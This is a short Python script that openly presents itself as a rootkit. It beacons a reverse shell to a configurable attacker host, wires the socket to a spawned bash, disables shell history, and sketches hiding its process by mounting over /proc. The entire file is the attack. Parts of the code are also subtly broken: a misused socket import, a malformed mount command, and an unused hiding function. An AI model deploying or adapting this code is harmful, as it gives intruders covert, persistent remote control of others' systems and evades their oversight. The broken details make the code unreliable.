from subprocess import Popen, PIPE
from socket import socket
from string import ascii_letters, digits
from os import getpid, dup2, putenv
from random import choice
from time import sleep
from pty import spawn
from argparse import ArgumentParser

"""
rootkit to install on client and sends a reverse shell beacon
hides processes by mounting proc folder to a tmp directory 
"""

token = ''.join(choice(ascii_letters + digits) for _ in range(72))
pid = getpid()

TMP_DIR = ''
BEACON_INTERVAL = 0
LHOST = ""
LPORT = 0


def PROC_HIDE_CMD(): return f'mount -o {TMP_DIR} /proc/{pid}'


def shell(lhost, lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    dup2(s.fileno(), 0)
    dup2(s.fileno(), 1)
    dup2(s.fileno(), 2)
    putenv("HISTFILE", '/dev/null')
    spawn("/bin/bash")
    s.close()


while True:
    shell(LHOST, LPORT)
    sleep(BEACON_INTERVAL)
